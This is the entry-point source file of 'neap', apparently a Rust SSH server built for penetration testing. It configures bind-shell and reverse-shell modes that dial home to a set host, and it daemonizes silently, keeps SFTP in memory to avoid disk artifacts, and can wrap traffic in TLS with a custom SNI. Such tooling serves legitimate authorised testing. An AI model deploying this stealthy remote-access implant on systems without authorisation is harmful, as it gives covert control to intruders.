mod config;
mod daemon;
mod error;
mod exec;
mod forwarding;
mod info;
mod memfs;
mod memsftp;
mod pty;
mod server;
mod session;
mod sftp;
mod transport;

use error::Result;

/// Runtime parameters resolved from CLI flags (cli feature) or compile-time
/// constants (no-cli / NOCLI build).
pub struct Params {
    pub luser: String,
    pub lhost: String,
    pub lport: u16,
    pub bind_port: u16,
    pub listen: bool,
    pub shell: String,
    pub no_shell: bool,
    pub verbose: bool,
    pub tls_wrap: bool,
    pub tls_sni: String,
    pub memfs: bool,
}

// ---------------------------------------------------------------------------
// CLI build – parse arguments with clap
// ---------------------------------------------------------------------------
#[cfg(feature = "cli")]
fn parse_params() -> Result<Params> {
    use clap::Parser;

    /// Neap – a statically-linked SSH server for penetration testing
    #[derive(Parser)]
    #[command(name = "neap", version = config::VERSION, about)]
    struct Cli {
        /// Start in listening mode (bind shell)
        #[arg(short = 'l', long = "listen")]
        listen: bool,

        /// Port for SSH connections
        #[arg(short = 'p', long = "port", default_value = config::LPORT)]
        port: u16,

        /// Bind port after dialling home
        #[arg(short = 'b', long = "bind-port", default_value = config::BPORT)]
        bind_port: u16,

        /// Shell to spawn
        #[arg(short = 's', long = "shell", default_value = config::DEFAULT_SHELL)]
        shell: String,

        /// Deny shell/exec/subsystem and local port forwarding
        #[arg(short = 'N', long = "no-shell")]
        no_shell: bool,

        /// Verbose logging to stderr
        #[arg(short = 'v', long = "verbose")]
        verbose: bool,

        /// Use in-memory filesystem for SFTP (no disk artifacts)
        #[arg(long = "memfs")]
        memfs: bool,

        /// [user@]host – target for reverse-shell mode
        #[arg(name = "TARGET")]
        target: Option<String>,
    }

    let cli = Cli::parse();

    // Parse optional TARGET into luser / lhost
    let (luser, lhost) = if let Some(ref target) = cli.target {
        if let Some(pos) = target.find('@') {
            (target[..pos].to_string(), target[pos + 1..].to_string())
        } else {
            (config::LUSER.to_string(), target.clone())
        }
    } else {
        (config::LUSER.to_string(), config::LHOST.to_string())
    };

    Ok(Params {
        luser,
        lhost,
        lport: cli.port,
        bind_port: cli.bind_port,
        listen: cli.listen,
        shell: cli.shell,
        no_shell: cli.no_shell,
        verbose: cli.verbose,
        tls_wrap: !config::TLS_WRAP.is_empty(),
        tls_sni: config::TLS_SNI.to_string(),
        memfs: cli.memfs || !config::MEMFS.is_empty(),
    })
}

// ---------------------------------------------------------------------------
// NOCLI build – all values from compile-time constants
// ---------------------------------------------------------------------------
#[cfg(not(feature = "cli"))]
fn parse_params() -> Result<Params> {
    let lport: u16 = config::LPORT
        .parse()
        .map_err(|_| NeapError::InvalidPort(config::LPORT.to_string()))?;
    let bind_port: u16 = config::BPORT
        .parse()
        .map_err(|_| NeapError::InvalidPort(config::BPORT.to_string()))?;

    Ok(Params {
        luser: config::LUSER.to_string(),
        lhost: config::LHOST.to_string(),
        lport,
        bind_port,
        listen: false,
        shell: config::DEFAULT_SHELL.to_string(),
        no_shell: false,
        verbose: false,
        tls_wrap: !config::TLS_WRAP.is_empty(),
        tls_sni: config::TLS_SNI.to_string(),
        memfs: !config::MEMFS.is_empty(),
    })
}

fn main() {
    // Parse CLI first — clap handles --help/--version and exits before
    // daemonization so output reaches the terminal.
    let params = match parse_params() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("neap: {}", e);
            std::process::exit(1);
        }
    };

    // Daemonize after CLI parsing but before async runtime
    daemon::daemonize();

    tokio_main(params);
}

#[tokio::main]
async fn tokio_main(params: Params) {
    // Initialise logging: Off by default, Info with -v
    let level = if params.verbose {
        log::LevelFilter::Info
    } else {
        log::LevelFilter::Off
    };
    let _ = env_logger::builder().filter_level(level).try_init();

    log::info!("neap v{}", config::VERSION);

    let mode = if params.listen || params.lhost.is_empty() {
        "bind"
    } else {
        "reverse"
    };
    log::info!("Mode: {}", mode);

    log::info!("Port: {}", params.lport);

    if mode == "reverse" {
        log::info!("Target: {}@{}", params.luser, params.lhost);
        log::info!("Bind port: {}", params.bind_port);
    }

    if params.tls_wrap {
        log::info!("TLS: enabled (SNI: {})", params.tls_sni);
    } else {
        log::info!("TLS: disabled");
    }

    if let Err(e) = transport::run(&params).await {
        log::error!("neap: {}", e);
        std::process::exit(1);
    }
}
